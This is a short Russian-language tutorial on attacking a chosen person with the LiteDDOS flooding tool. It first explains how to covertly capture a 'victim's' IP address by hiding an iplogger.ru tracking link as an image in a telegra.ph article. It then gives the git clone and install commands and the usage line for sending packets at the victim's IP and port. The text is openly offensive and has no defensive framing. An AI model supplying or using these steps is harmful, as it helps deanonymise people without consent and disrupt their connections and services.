Мутим DDoS атаку по IP с помощью LiteDDOS

И так, для начала напомню как добыть айпи жертвы. 

1. Заходим на iplogger.ru
2. Заходим на вкладку "Невидимый логгер"
3. Получаем ссылку
4. Создаем статью в telegra.ph и вставляем как код наш логгер с .jpg в конце и нажимаем Enter
5. Публикуем и меняем с telegra.ph на tgraph.io
6. Ждем пока жертва зайдет.

Установка LITEDDOS

Обновляемся
apt update && apt upgrade

Качаем git,python2
apt install git python2

Копируем репозиторий с гитхаб
git clone https://github.com/4L13199/LITEDDOS

Входим в директорию
cd LITEDDOS

Как пользоваться:

python2 LITEDDOS.py <ip> <port> <packet>
<ip> - ip жертвы
<port> - порт через который мы будем делать DDoS
<packet> - количество пакетов (100 оптимально)